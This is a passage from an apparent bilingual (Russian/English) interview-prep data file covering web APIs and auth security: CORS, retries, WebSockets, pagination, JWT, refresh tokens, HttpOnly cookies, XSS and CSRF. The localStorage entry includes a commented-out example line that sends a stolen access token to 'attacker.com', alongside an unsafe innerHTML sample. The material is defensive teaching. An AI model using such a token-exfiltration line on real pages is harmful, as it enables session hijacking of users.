            "Same-origin policy — это защита браузера по умолчанию: скрипт с https://app.example.com не может прочитать ответ fetch к https://api.other.com, если сервер api.other.com явно не добавил заголовок Access-Control-Allow-Origin, разрешающий этот конкретный (или любой, через *) origin. Важно понимать: сам запрос браузер всё равно отправляет (сервер его получает и может выполнить побочный эффект) — CORS блокирует именно чтение ответа JS-кодом на стороне клиента, а не выполнение запроса как такового. Preflight-запрос (автоматический OPTIONS перед основным запросом) отправляется браузером, когда запрос считается 'непростым' — не GET/HEAD/POST с простым Content-Type, либо содержит нестандартные заголовки (например, Authorization) — сервер должен ответить на OPTIONS корректными CORS-заголовками, разрешающими нужный метод и заголовки, прежде чем браузер отправит реальный запрос. credentials: 'include' (для отправки cookies межсайтово) требует, чтобы Access-Control-Allow-Origin был конкретным доменом, а не *, и дополнительно Access-Control-Allow-Credentials: true на сервере.",
          codeExample:
            "// Клиент: запрос с credentials (cookies) на другой origin\nfetch('https://api.example.com/data', {\n  credentials: 'include', // требует конкретный Allow-Origin на сервере, не *\n  headers: { Authorization: 'Bearer token' }, // 'непростой' заголовок -> вызовет preflight OPTIONS\n});\n\n// Сервер должен ответить на OPTIONS и на сам запрос заголовками:\n// Access-Control-Allow-Origin: https://app.example.com\n// Access-Control-Allow-Headers: Authorization, Content-Type\n// Access-Control-Allow-Credentials: true",
          whereUsed:
            "Любая архитектура, где фронтенд и бэкенд обслуживаются с разных доменов/портов (SPA на одном домене, API на другом; локальная разработка на localhost:3000, обращающаяся к API на localhost:4000).",
          interviewQuestion: "Блокирует ли CORS сам запрос к серверу, или только чтение ответа браузером?",
          interviewAnswerRu:
            "CORS не блокирует сам сетевой запрос — браузер его всё равно отправляет (кроме случая, когда preflight-проверка не прошла), и сервер получает его и может выполнить связанный с ним побочный эффект (например, реально создать запись в БД, если это был POST). CORS блокирует именно возможность JS-кода на странице ПРОЧИТАТЬ тело и заголовки ответа, если сервер не прислал разрешающие CORS-заголовки — это важное различие: наивное 'CORS запрещает делать запросы к другому домену' неточно, правильнее — 'CORS запрещает читать чужой ответ без явного разрешения сервера'.",
          interviewAnswerEn:
            "CORS doesn't block the network request itself — the browser still sends it (unless the preflight check fails), and the server receives it and can carry out any associated side effect (like actually creating a database record, if it was a POST). CORS specifically blocks the page's JS code from READING the response body and headers if the server didn't send permissive CORS headers — an important distinction: the naive 'CORS prevents making requests to another domain' is inaccurate; it's more correct to say 'CORS prevents reading someone else's response without their explicit permission'.",
          pitfalls: [
            "Считать, что CORS полностью защищает сервер от нежелательных запросов — это защита браузера на чтение ответа, а не аутентификация/авторизация на сервере.",
            "Ставить Access-Control-Allow-Origin: * вместе с credentials: include — браузер такую комбинацию прямо запрещает по спецификации.",
          ],
        },
      },
      {
        id: "apis-retry-timeout-backoff",
        title: "Retry, Timeout, Exponential Backoff",
        content: {
          title: "Retry, Timeout, Exponential Backoff",
          shortExplanation:
            "Timeout ограничивает, сколько приложение готово ждать ответ, прежде чем считать запрос неудавшимся; retry повторяет неудавшийся запрос; exponential backoff увеличивает паузу между повторными попытками экспоненциально, чтобы не заваливать и без того перегруженный или временно недоступный сервер новыми запросами.",
          detailedExplanation:
            "Без timeout запрос к зависшему или очень медленному серверу может 'висеть' неопределённо долго, блокируя UI-состояние загрузки бесконечно — AbortController с setTimeout позволяет явно отменить fetch, если ответ не пришёл в разумный срок. Retry имеет смысл только для временных, вероятно проходящих ошибок (сетевой сбой, 503 Service Unavailable, таймаут) — повторять запрос при 400 Bad Request или 401 Unauthorized бессмысленно, потому что ошибка не исчезнет от повторной попытки без изменения самого запроса. Exponential backoff (задержка вида base * 2^attempt, обычно с добавлением случайного джиттера) решает проблему 'thundering herd' — если сотни клиентов одновременно получили ошибку и все ретраят через одинаковый фиксированный интервал, они снова одновременно перегрузят и так уже проблемный сервер; растущая и слегка случайная задержка размазывает повторные попытки во времени. Retry обязательно должен иметь ограничение на число попыток — бесконечный retry при постоянной недоступности сервиса превращается в собственный DoS-подобный источник нагрузки.",
          codeExample:
            "async function fetchWithRetry(url, maxAttempts = 3) {\n  for (let attempt = 0; attempt < maxAttempts; attempt++) {\n    const controller = new AbortController();\n    const timeoutId = setTimeout(() => controller.abort(), 5000); // timeout 5с\n    try {\n      const response = await fetch(url, { signal: controller.signal });\n      clearTimeout(timeoutId);\n      if (response.ok) return response;\n      if (response.status < 500) throw new Error('Non-retryable'); // 4xx — не ретраим\n    } catch (error) {\n      if (attempt === maxAttempts - 1) throw error;\n      const delay = Math.min(1000 * 2 ** attempt + Math.random() * 300, 10000); // backoff + jitter\n      await new Promise((resolve) => setTimeout(resolve, delay));\n    }\n  }\n}",
          whereUsed:
            "Интеграции с внешними/сторонними API, нестабильными сетями (мобильные клиенты), очереди фоновых задач, любые критичные мутации, где временный сбой сети не должен приводить к постоянной потере действия пользователя.",
          interviewQuestion: "Почему retry без exponential backoff может усугубить проблему перегруженного сервера вместо того, чтобы её решить?",
          interviewAnswerRu:
            "Если сервер временно перегружен и отвечает ошибками, а все клиенты немедленно и с одинаковым фиксированным интервалом повторяют запрос, они синхронно создают новую волну нагрузки в момент, когда сервер и так испытывает трудности — это явление называют thundering herd, и оно способно продлить или усугубить сбой вместо того, чтобы дать серверу время восстановиться. Exponential backoff с джиттером размазывает повторные попытки разных клиентов по времени вместо синхронного 'залпа', давая серверу реальный шанс справиться с нагрузкой и восстановиться постепенно.",
          interviewAnswerEn:
            "If the server is temporarily overloaded and returns errors, and every client immediately retries at the same fixed interval, they synchronously create a fresh wave of load at exactly the moment the server is already struggling — this is called the thundering herd problem, and it can prolong or worsen an outage instead of giving the server room to recover. Exponential backoff with jitter spreads different clients' retries out over time instead of a synchronized burst, giving the server a real chance to handle the load and recover gradually.",
          pitfalls: [
            "Ретраить неидемпотентные запросы (POST без idempotency key) — риск дублирования побочного эффекта при повторной попытке.",
            "Не ограничивать максимальное число попыток retry — бесконечные повторы при затяжном сбое сами превращаются в источник избыточной нагрузки.",
          ],
        },
      },
      {
        id: "apis-polling-websocket-sse",
        title: "Polling vs WebSocket vs SSE",
        content: {
          title: "Polling vs WebSocket vs SSE",
          shortExplanation:
            "Polling — клиент периодически сам спрашивает сервер 'есть ли что-то новое'; SSE (Server-Sent Events) — сервер держит одно открытое HTTP-соединение и сам присылает события клиенту, но только в одну сторону; WebSocket — полностью двунаправленный постоянный канал связи между клиентом и сервером.",
          detailedExplanation:
            "Polling (обычный периодический fetch по таймеру) прост в реализации и работает через обычный HTTP без особой инфраструктуры, но создаёт постоянную нагрузку 'вхолостую' (большинство опросов не приносят ничего нового) и вносит задержку до интервала опроса между реальным событием и его получением клиентом. SSE использует один долгоживущий HTTP-запрос (EventSource API в браузере), через который сервер может присылать текстовые события клиенту в любой момент без нового запроса — это проще WebSocket в реализации (обычный HTTP, работает через большинство прокси/файрволов без специальной настройки, автоматически переподключается при разрыве), но принципиально однонаправлен: клиент не может отправлять данные через тот же канал. WebSocket устанавливает отдельный протокол поверх TCP после начального HTTP-рукопожатия (Upgrade: websocket) и даёт полный двунаправленный канал с низкой задержкой в обе стороны — необходим, когда клиент должен часто и быстро отправлять данные серверу в реальном времени (чат, совместное редактирование, игры), а не только получать обновления.",
          codeExample:
            "// SSE — однонаправленный поток событий от сервера\nconst eventSource = new EventSource('/api/notifications/stream');\neventSource.onmessage = (event) => console.log('New notification:', event.data);\n\n// WebSocket — двунаправленный канал\nconst socket = new WebSocket('wss://api.example.com/chat');\nsocket.onmessage = (event) => console.log('Received:', event.data);\nsocket.send(JSON.stringify({ type: 'message', text: 'Привет' })); // отправка от клиента",
          whereUsed:
            "Polling — низкочастотные обновления, где простота важнее задержки (проверка статуса длительной фоновой задачи раз в несколько секунд). SSE — уведомления, живые ленты, прогресс long-running операций (сервер -> клиент). WebSocket — чаты, совместное редактирование документов, real-time-игры, торговые терминалы (частый двунаправленный обмен).",
          interviewQuestion: "Почему для чата обычно выбирают WebSocket, а не SSE, хотя SSE проще в реализации?",
          interviewAnswerRu:
            "Чат требует, чтобы клиент часто и быстро ОТПРАВЛЯЛ сообщения серверу в реальном времени, а не только получал их — SSE принципиально однонаправлен (только сервер -> клиент), поэтому для отправки сообщений от клиента пришлось бы параллельно использовать отдельные обычные HTTP-запросы, что усложняет архитектуру и не даёт единого канала с предсказуемой задержкой в обе стороны. WebSocket сразу даёт единый двунаправленный канал с низкой задержкой для обоих направлений, что естественно соответствует характеру чата, где обе стороны одинаково часто и обмен идёт в реальном времени.",
          interviewAnswerEn:
            "Chat requires the client to frequently and quickly SEND messages to the server in real time, not just receive them — SSE is fundamentally one-directional (server to client only), so sending messages from the client would require separate regular HTTP requests running in parallel, complicating the architecture and forfeiting a single channel with predictable latency in both directions. WebSocket immediately provides one bidirectional, low-latency channel for both directions, which naturally matches chat's nature, where both sides exchange messages equally frequently in real time.",
          pitfalls: [
            "Использовать WebSocket там, где реально нужен только поток обновлений от сервера (SSE было бы проще и с меньшей инфраструктурной сложностью).",
            "Забывать про переподключение и восстановление состояния при разрыве WebSocket-соединения (в отличие от EventSource, который переподключается автоматически из коробки).",
          ],
        },
      },
      {
        id: "apis-pagination-filtering-sorting",
        title: "Pagination, Filtering, Sorting",
        content: {
          title: "Pagination, Filtering, Sorting",
          shortExplanation:
            "Offset-based пагинация (страница + размер страницы) проста, но деградирует на больших наборах данных и 'плывёт' при одновременных изменениях данных; cursor-based пагинация (указатель на последний увиденный элемент) стабильнее и эффективнее для больших и часто меняющихся коллекций.",
          detailedExplanation:
            "Offset-пагинация (?page=5&limit=20, что на уровне БД означает OFFSET 80 LIMIT 20) требует от базы данных буквально пропустить (просканировать и отбросить) первые 80 строк перед тем, как вернуть нужные — на очень больших таблицах это становится всё медленнее с ростом offset. Она также нестабильна при параллельных изменениях: если между запросом страницы 1 и страницы 2 кто-то удалил запись с первой страницы, все последующие записи 'сдвигаются', и один и тот же элемент может либо повториться на двух страницах, либо вообще пропасть из выдачи. Cursor-based пагинация вместо номера страницы передаёт указатель ('курсор') на последний увиденный элемент (обычно его id или комбинацию отсортированных полей) — запрос вида WHERE id > lastSeenId ORDER BY id LIMIT 20 эффективен независимо от того, как далеко 'вглубь' списка ушёл пользователь, и устойчив к вставкам/удалениям в уже просмотренной части списка. Фильтрация и сортировка обычно передаются как отдельные query-параметры (?sort=price&order=asc&category=shoes), и важно, чтобы на бэкенде существовали соответствующие индексы БД для полей, по которым разрешена сортировка/фильтрация — без индекса сортировка по большому набору данных станет дорогой операцией независимо от способа пагинации.",
          codeExample:
            "// Offset-based — просто, но деградирует на больших offset\nGET /api/products?page=5&limit=20\n\n// Cursor-based — стабильно и эффективно для больших/часто меняющихся наборов\nGET /api/products?cursor=eyJpZCI6MTIzfQ&limit=20\n// Ответ включает nextCursor для следующего запроса:\n// { items: [...], nextCursor: 'eyJpZCI6MTQzfQ' }",
          whereUsed:
            "Offset-пагинация — админки и небольшие таблицы, где важна возможность 'перепрыгнуть' сразу на страницу N. Cursor-based — бесконечная прокрутка лент (соцсети, каталоги товаров), большие и часто изменяющиеся наборы данных, GraphQL Relay-style connections.",
          interviewQuestion: "Почему offset-пагинация может привести к дублированию или пропуску элементов при одновременных изменениях данных?",
          interviewAnswerRu:
            "Offset-пагинация определяет 'какую страницу показать' исключительно по позиции в отсортированном наборе на момент конкретного запроса, а не по идентичности элементов. Если между запросом страницы 1 (элементы 1-20) и страницы 2 (элементы 21-40) кто-то удаляет элемент из первой двадцатки, все последующие элементы сдвигаются на одну позицию вверх — то, что должно было быть элементом 21, теперь становится элементом 20 и уже было показано на предыдущей странице, поэтому оно пропадает из общей выдачи; аналогично при вставке нового элемента в начало один и тот же элемент может показаться на двух соседних страницах подряд.",
          interviewAnswerEn:
            "Offset pagination defines 'which page to show' purely by position within the sorted set at the time of a specific request, not by item identity. If an item from the first twenty gets deleted between the request for page 1 (items 1-20) and page 2 (items 21-40), every following item shifts up by one position — what should have been item 21 is now item 20 and was already shown on the previous page, so it disappears from the overall result set; similarly, inserting a new item at the start can cause the same item to appear on two consecutive pages.",
          pitfalls: [
            "Использовать offset-пагинацию для очень больших или часто меняющихся коллекций и получать дубли/пропуски элементов, которые сложно диагностировать.",
            "Разрешать сортировку по полю без индекса в БД — на больших таблицах такой запрос становится непропорционально медленным независимо от типа пагинации.",
          ],
        },
      },
      {
        id: "apis-n-plus-one-dataloader",
        title: "N+1, Batching, DataLoader",
        content: {
          title: "N+1, Batching, DataLoader",
          shortExplanation:
            "N+1 — распространённая проблема производительности, когда один запрос за списком из N записей влечёт за собой ещё N отдельных запросов (обычно к БД) за связанными данными каждой записи, вместо одного batched-запроса за всеми связанными данными сразу.",
          detailedExplanation:
            "Классический пример: запрос списка из 50 постов (1 запрос), а затем для каждого поста отдельный запрос за его автором (ещё 50 запросов) — итого 51 запрос там, где было бы достаточно двух (посты + все нужные авторы одним JOIN или одним запросом с WHERE id IN (...)). Проблема особенно часто возникает в GraphQL, где резолвер каждого поля пишется независимо и как будто не подозревает о существовании 'соседних' записей в том же списке — резолвер поля author для каждого поста в списке вызывается отдельно, не зная, что рядом ещё 49 таких же вызовов происходят в рамках одного и того же запроса клиента. DataLoader (библиотека, изначально созданная Facebook для GraphQL) решает это через batching и кеширование в рамках одного тика event loop: вместо немедленного запроса к БД при каждом вызове .load(id) он накапливает все id, запрошенные за этот 'тик', и делает один batched-запрос сразу за всеми накопленными id, возвращая каждому вызывающему коду соответствующий результат из общего батча — плюс кеширует результат в рамках одного запроса, чтобы повторный .load(тот же id) не создавал новый запрос вовсе.",
          codeExample:
            "// Без DataLoader — классический N+1: 1 запрос за постами + N запросов за авторами\nconst posts = await db.post.findMany();\nfor (const post of posts) {\n  post.author = await db.user.findUnique({ where: { id: post.authorId } }); // N отдельных запросов\n}\n\n// С DataLoader — все id авторов батчатся в один запрос\nconst userLoader = new DataLoader(async (ids) => {\n  const users = await db.user.findMany({ where: { id: { in: ids } } }); // 1 запрос за всеми сразу\n  return ids.map((id) => users.find((u) => u.id === id));\n});\nconst posts = await db.post.findMany();\nfor (const post of posts) {\n  post.author = await userLoader.load(post.authorId); // батчируется автоматически\n}",
          whereUsed:
            "GraphQL-резолверы со связанными сущностями (посты и их авторы, заказы и их товары), любой REST-эндпоинт, отдающий список с вложенными связанными данными, ORM-код, где легко случайно написать цикл с запросом внутри.",
          interviewQuestion: "Как DataLoader решает проблему N+1, не заставляя разработчика вручную переписывать резолвер под batching?",
          interviewAnswerRu:
            "DataLoader предоставляет метод .load(key), который выглядит как обычный отдельный асинхронный вызов за одной записью, но на самом деле не выполняет запрос немедленно — вместо этого он накапливает все ключи, запрошенные в рамках текущего 'тика' event loop (то есть до следующей микрозадачи), а затем выполняет один batch-функцию с полным списком накопленных ключей и распределяет результаты обратно по всем ожидающим .load()-вызовам. Благодаря этому резолвер каждого отдельного поля продолжает писаться так, будто он ничего не знает о соседних вызовах, а батчинг происходит прозрачно на уровне самого DataLoader, без изменения структуры кода резолверов.",
          interviewAnswerEn:
            "DataLoader exposes a .load(key) method that looks like a regular standalone async call for one record, but doesn't actually run a query immediately — instead it accumulates every key requested within the current event loop tick (i.e. before the next microtask), then runs one batch function with the full list of accumulated keys and distributes the results back to all the waiting .load() calls. Thanks to this, each individual field resolver keeps being written as if it knows nothing about sibling calls, and batching happens transparently at the DataLoader level, with no change to the resolvers' code structure.",
          pitfalls: [
            "Писать цикл с await-запросом к БД внутри него для каждого элемента списка — классический источник N+1, легко упускаемый из виду при code review.",
            "Создавать новый экземпляр DataLoader глобально на всё приложение вместо одного на каждый HTTP-запрос — приводит к утечке кеша между разными пользователями/запросами.",
          ],
        },
      },
    ],
  },

  // ---------------------------------------------------------------------
  // AUTHORIZATION & SECURITY
  // ---------------------------------------------------------------------
  {
    id: "auth-security",
    title: "Authorization & Security",
    subtopics: [
      {
        id: "auth-authn-vs-authz",
        title: "Authentication vs Authorization",
        content: {
          title: "Authentication vs Authorization",
          shortExplanation:
            "Authentication (аутентификация) отвечает на вопрос 'кто ты?', authorization (авторизация) — на вопрос 'что тебе разрешено делать?'.",
          detailedExplanation:
            "Аутентификация — это процесс проверки личности пользователя: логин/пароль, OAuth, magic link, биометрия. Результат аутентификации — подтверждённая личность (обычно в виде токена или сессии). Авторизация происходит уже после аутентификации и решает, какие действия и ресурсы доступны этому конкретному пользователю (роли, права, ownership ресурса). Путаница между ними часто приводит к багам безопасности: например, проверяют только 'залогинен ли пользователь', но не проверяют, имеет ли он право на конкретное действие.",
          codeExample:
            "// Authentication: кто ты\nconst session = await getSession(request);\nif (!session) return redirect('/login');\n\n// Authorization: что тебе можно\nif (session.user.role !== 'admin') {\n  return new Response('Forbidden', { status: 403 });\n}",
          interviewQuestion: "Приведите пример бага, который возникает из-за смешивания authentication и authorization.",
          interviewAnswerRu:
            "Классический пример — эндпоинт /api/orders/:id проверяет только 'пользователь залогинен', но не проверяет, принадлежит ли конкретный заказ этому пользователю. В результате любой аутентифицированный пользователь может подставить чужой id и увидеть чужой заказ (это относится к классу уязвимостей IDOR — Insecure Direct Object Reference).",
          interviewAnswerEn:
            "A classic example is an /api/orders/:id endpoint that only checks 'is the user logged in' but never checks whether this particular order belongs to that user. As a result, any authenticated user can substitute someone else's id and view their order — this falls into the IDOR (Insecure Direct Object Reference) vulnerability class.",
          pitfalls: [
            "Проверять права доступа только на фронтенде (скрывать кнопку) без проверки на бэкенде.",
            "Путать роль пользователя (role) с владением конкретным ресурсом (ownership) — это разные проверки.",
          ],
          practiceTask:
            "Опишите (в псевдокоде или реальном коде) middleware, которое сначала проверяет аутентификацию (валидный токен), а затем отдельно — авторизацию (роль admin) для доступа к /admin.",
          resources: {
            docs: [
              { title: "OWASP Top 10: Broken Access Control", url: "https://owasp.org/Top10/A01_2021-Broken_Access_Control/" },
            ],
            articles: [
              { title: "Insecure Direct Object References (IDOR) — PortSwigger", url: "https://portswigger.net/web-security/access-control/idor" },
            ],
          },
        },
      },
      {
        id: "auth-jwt-vs-session",
        title: "JWT vs Session",
        content: {
          title: "JWT vs Session",
          shortExplanation:
            "Session-based auth хранит состояние сессии на сервере и выдаёт клиенту только id сессии; JWT хранит все данные пользователя прямо в подписанном токене, не требуя хранилища на сервере.",
          detailedExplanation:
            "При session-based подходе сервер после логина создаёт запись в хранилище сессий (обычно в Redis/БД) и отдаёт клиенту session id (обычно в cookie). При каждом запросе сервер ищет сессию по этому id. При JWT-подходе сервер выдаёт клиенту подписанный токен, который сам содержит нужные данные (userId, роль, срок действия) — сервер может проверить его подпись без обращения к БД, но зато отозвать (revoke) JWT до истечения срока действия сложнее, чем удалить запись сессии.",
          codeExample:
            "// Session: сервер хранит состояние\n// cookie: sessionId=abc123 -> Redis: { userId: 42, role: 'user' }\n\n// JWT: состояние 'внутри' токена, сервер только проверяет подпись\n// cookie: token=eyJhbGciOi... -> decode -> { userId: 42, role: 'user', exp: 1234567890 }",
          interviewQuestion: "Почему отозвать JWT-токен сложнее, чем сессию в БД?",
          interviewAnswerRu:
            "Сессия хранится на сервере, поэтому для мгновенного отзыва достаточно удалить запись из хранилища — при следующем запросе сервер её просто не найдёт. JWT самодостаточен: сервер проверяет только подпись и срок действия, не обращаясь к базе, поэтому если токен скомпрометирован, он остаётся действительным до истечения exp, если не завести отдельный механизм — blacklist отозванных токенов или короткий срок жизни access-токена с refresh-токеном.",
          interviewAnswerEn:
            "A session is stored server-side, so instant revocation is just deleting that record — the next request simply won't find it. A JWT is self-contained: the server only checks its signature and expiry without hitting a database, so a compromised token stays valid until it expires unless you add an extra mechanism — a blacklist of revoked tokens, or a short-lived access token paired with a refresh token.",
          pitfalls: [
            "Хранить в JWT слишком много или чувствительных данных — токен легко декодируется (не шифруется, а лишь подписывается).",
            "Делать JWT с очень долгим сроком жизни без механизма отзыва.",
          ],
          practiceTask:
            "Раскодируйте (без секретного ключа) любой реальный JWT на jwt.io и посмотрите, какие данные лежат в payload открытым текстом.",
          resources: {
            docs: [
              { title: "Introduction to JSON Web Tokens", url: "https://jwt.io/introduction" },
            ],
            articles: [
              { title: "ID Token and Access Token: What's the Difference? (Auth0)", url: "https://auth0.com/blog/id-token-access-token-what-is-the-difference/" },
            ],
          },
        },
      },
      {
        id: "auth-access-refresh-token",
        title: "Access Token / Refresh Token",
        content: {
          title: "Access Token / Refresh Token",
          shortExplanation:
            "Access token — короткоживущий токен для доступа к API; refresh token — долгоживущий токен, который используется только для получения нового access token.",
          detailedExplanation:
            "Схема с двумя токенами решает конфликт между безопасностью и удобством: короткий срок жизни access token (минуты) снижает ущерб от его утечки, а refresh token (дни/недели), который хранится более защищённо (HttpOnly cookie) и используется реже, позволяет не заставлять пользователя логиниться заново каждые несколько минут. Когда access token истекает, клиент обращается к специальному эндпоинту с refresh token и получает новую пару токенов.",
          codeExample:
            "// Access token живёт 15 минут, используется в каждом запросе\nAuthorization: Bearer <access_token>\n\n// Когда access token истёк -> запрос на обновление\nPOST /auth/refresh\nCookie: refreshToken=<refresh_token> (HttpOnly)\n-> { accessToken: '<new_access_token>' }",
          interviewQuestion: "Зачем нужны два токена вместо одного долгоживущего?",
          interviewAnswerRu:
            "Один долгоживущий токен — это большой риск: если он утечёт, злоумышленник получает доступ на весь срок его жизни. Короткий access token минимизирует окно атаки, а refresh token, который используется редко и хранится в защищённом месте (HttpOnly, Secure cookie), даёт возможность обновлять access token без повторного логина, сохраняя баланс между безопасностью и удобством пользователя.",
          interviewAnswerEn:
            "A single long-lived token is a big risk: if it leaks, an attacker gets access for its entire lifetime. A short-lived access token minimizes that attack window, while a refresh token — used rarely and stored somewhere protected (an HttpOnly, Secure cookie) — lets the client get a new access token without forcing the user to log in again, balancing security and user convenience.",
          pitfalls: [
            "Хранить refresh token в localStorage — он становится доступен для чтения через XSS.",
            "Не реализовывать отзыв refresh token (например, при logout или подозрительной активности).",
          ],
          practiceTask:
            "Опишите (в псевдокоде) клиентский interceptor, который при получении 401 от API автоматически пытается обновить access token через refresh token и повторяет исходный запрос один раз.",
          resources: {
            docs: [
              { title: "Introduction to JSON Web Tokens", url: "https://jwt.io/introduction" },
            ],
            articles: [
              { title: "What Are Refresh Tokens and How to Use Them Securely (Auth0)", url: "https://auth0.com/blog/refresh-tokens-what-are-they-and-when-to-use-them/" },
              { title: "ID Token and Access Token: What's the Difference? (Auth0)", url: "https://auth0.com/blog/id-token-access-token-what-is-the-difference/" },
            ],
          },
        },
      },
      {
        id: "auth-httponly-cookies",
        title: "HttpOnly Cookies",
        content: {
          title: "HttpOnly Cookies",
          shortExplanation:
            "HttpOnly cookie — cookie, недоступная из JavaScript (document.cookie), что защищает её от кражи через XSS-атаки.",
          detailedExplanation:
            "Обычные cookie и данные в localStorage доступны любому JS-коду на странице — если на сайте есть XSS-уязвимость (внедрение чужого скрипта), злоумышленник может прочитать токен и отправить его себе. Флаг HttpOnly запрещает браузеру давать доступ к такой cookie через JavaScript — она видна только в HTTP-заголовках при запросах к серверу. В сочетании с флагами Secure (только HTTPS) и SameSite (защита от CSRF) это один из базовых способов защиты токенов аутентификации.",
          codeExample:
            "Set-Cookie: refreshToken=abc123; HttpOnly; Secure; SameSite=Strict; Path=/auth\n\n// В браузере:\ndocument.cookie; // 'refreshToken' здесь не будет виден вообще",
          interviewQuestion: "Почему токен аутентификации лучше хранить в HttpOnly cookie, а не в localStorage?",
          interviewAnswerRu:
            "localStorage полностью доступен из JavaScript, поэтому при любой XSS-уязвимости на сайте злоумышленник может прочитать токен и украсть сессию пользователя. HttpOnly cookie не читается из JS вообще, поэтому даже при успешной XSS-атаке украсть сам токен напрямую не получится — браузер сам прикрепляет cookie к запросам к нужному домену.",
          interviewAnswerEn:
            "localStorage is fully accessible from JavaScript, so any XSS vulnerability on the site lets an attacker read the token and hijack the user's session. An HttpOnly cookie can't be read from JS at all, so even a successful XSS attack can't directly steal the token itself — the browser attaches the cookie to requests to the right domain automatically.",
          pitfalls: [
            "Считать HttpOnly cookie полной защитой от всего — она не защищает от CSRF без дополнительного SameSite/CSRF-токена.",
            "Хранить в localStorage 'просто для удобства чтения на клиенте' токены, которые должны быть защищены.",
          ],
          practiceTask:
            "Настройте простой Express/Next.js эндпоинт логина, который ставит refreshToken как HttpOnly, Secure, SameSite=Strict cookie, и проверьте в DevTools, что document.cookie её не показывает.",
          resources: {
            docs: [
              { title: "Using HTTP Cookies — MDN", url: "https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies" },
            ],
            articles: [
              { title: "Secure Cookie Configuration — MDN", url: "https://developer.mozilla.org/en-US/docs/Web/Security/Practical_implementation_guides/Cookies" },
            ],
          },
        },
      },
      {
        id: "auth-xss-csrf-cors",
        title: "XSS / CSRF / CORS",
        content: {
          title: "XSS / CSRF / CORS",
          shortExplanation:
            "XSS — внедрение чужого JS-кода на страницу; CSRF — выполнение нежелательного действия от имени залогиненного пользователя; CORS — механизм браузера, ограничивающий, какие сайты могут делать запросы к вашему API.",
          detailedExplanation:
            "XSS (Cross-Site Scripting) возникает, когда приложение вставляет непроверенный пользовательский ввод в DOM как исполняемый код — атакующий может выполнить свой JS в контексте вашего сайта. CSRF (Cross-Site Request Forgery) эксплуатирует то, что браузер автоматически прикладывает cookie к запросам — вредоносный сайт заставляет браузер жертвы отправить запрос на ваш API, используя её действующую сессию. CORS — это не уязвимость, а защитный механизм браузера: он не даёт JS-коду с одного origin читать ответы от API на другом origin, если сервер явно это не разрешил через заголовки.",
          codeExample:
            "// XSS-уязвимость: вставка непроверенного HTML\nelement.innerHTML = userInput; // опасно\n\n// Защита от CSRF: SameSite cookie + CSRF-токен в форме\nSet-Cookie: session=xyz; SameSite=Strict\n\n// CORS: сервер явно разрешает конкретный origin\nAccess-Control-Allow-Origin: https://myapp.com",
          interviewQuestion: "Защищает ли CORS ваш API от атак из других приложений (например, curl или Postman)?",
          interviewAnswerRu:
            "Нет. CORS — это ограничение, которое соблюдают только браузеры при выполнении JS-запросов с одной страницы к другому origin. Он никак не мешает прямому запросу через curl, Postman или серверный код — там просто нет браузерного движка, который проверяет CORS-заголовки. Поэтому CORS не заменяет настоящую аутентификацию и авторизацию на сервере, это просто defense для сценария 'чужой сайт делает запрос через браузер жертвы'.",
          interviewAnswerEn:
            "No. CORS is a restriction enforced only by browsers when JavaScript on one page tries to call another origin. It does nothing to stop a direct request via curl, Postman, or server-side code — there's no browser engine there to check CORS headers. So CORS is not a substitute for real server-side authentication and authorization; it's defense specifically for the 'another site makes a request through the victim's browser' scenario.",
          pitfalls: [
            "Считать, что настройка CORS = защита API — это не так, нужны отдельные проверки auth на сервере.",
            "Вставлять пользовательский контент через dangerouslySetInnerHTML/innerHTML без санитизации.",
          ],
          practiceTask:
            "Найдите в своём (или учебном) проекте все места, где пользовательский ввод вставляется в DOM напрямую, и проверьте, есть ли санитизация (например, через DOMPurify).",
          resources: {
            docs: [
              { title: "Types of Cross-Site Scripting — OWASP", url: "https://owasp.org/www-community/Types_of_Cross-Site_Scripting" },
            ],
            articles: [
              { title: "Cross-Site Request Forgery (CSRF) — MDN", url: "https://developer.mozilla.org/en-US/docs/Web/Security/Attacks/CSRF" },
              { title: "Cross-Origin Resource Sharing (CORS) — MDN", url: "https://developer.mozilla.org/en-US/docs/Web/HTTP/Guides/CORS" },
            ],
          },
        },
      },
      {
        id: "auth-localstorage-risks",
        title: "localStorage: риски хранения токенов",
        content: {
          title: "localStorage: риски хранения токенов",
          shortExplanation:
            "localStorage полностью доступен из любого JavaScript-кода, выполняющегося на странице — включая код, внедрённый через XSS-уязвимость, поэтому хранение access/refresh токенов там делает их кражу тривиальной при любой успешной XSS-атаке.",
          detailedExplanation:
            "В отличие от HttpOnly cookie, которую JavaScript в принципе не может прочитать (document.cookie её не покажет), localStorage.getItem('token') доступен абсолютно любому скрипту на странице — легитимному коду приложения, стороннему npm-пакету с уязвимостью, случайно внедрённому через XSS вредоносному скрипту. Это не теоретический риск: если у приложения есть хотя бы одна XSS-уязвимость где угодно (комментарий пользователя без экранирования, уязвимый npm-пакет, генерирующий innerHTML из непроверенных данных), злоумышленник получает token одной строкой кода и может полноценно действовать от имени пользователя, отправляя запросы с этим токеном откуда угодно, не будучи ограниченным same-origin policy браузера (в отличие от cookie, которая браузер сам прикрепляет только к запросам на нужный домен). Именно поэтому распространённая рекомендация — не хранить чувствительные токены в localStorage вовсе, а использовать HttpOnly cookie (недоступную для чтения через JS) в сочетании с CSRF-защитой (например, SameSite=Strict/Lax и/или CSRF-токеном), либо хранить access token только в памяти приложения (переменная JS, исчезающая при обновлении страницы) и полагаться на HttpOnly refresh token cookie для восстановления сессии после перезагрузки.",
          codeExample:
            "// Опасно: токен, доступный любому скрипту на странице\nlocalStorage.setItem('accessToken', token);\n// Если где-то на странице есть XSS — вот так его украдут:\n// fetch('https://attacker.com/steal?token=' + localStorage.getItem('accessToken'));\n\n// Безопаснее: access token только в памяти, восстанавливается через HttpOnly refresh cookie\nlet accessToken = null; // переменная модуля, недоступная через document.cookie/localStorage\nasync function refreshAccessToken() {\n  const res = await fetch('/api/refresh', { credentials: 'include' }); // HttpOnly cookie отправится сама\n  accessToken = (await res.json()).accessToken;\n}",
          whereUsed:
            "Решение о том, где хранить access/refresh токены, принимается на старте любого проекта с аутентификацией — особенно критично для финтеха, медицинских и других приложений с высокой чувствительностью данных пользователя.",
          interviewQuestion: "Почему HttpOnly cookie безопаснее localStorage для хранения токена именно против XSS, а не против CSRF?",
          interviewAnswerRu:
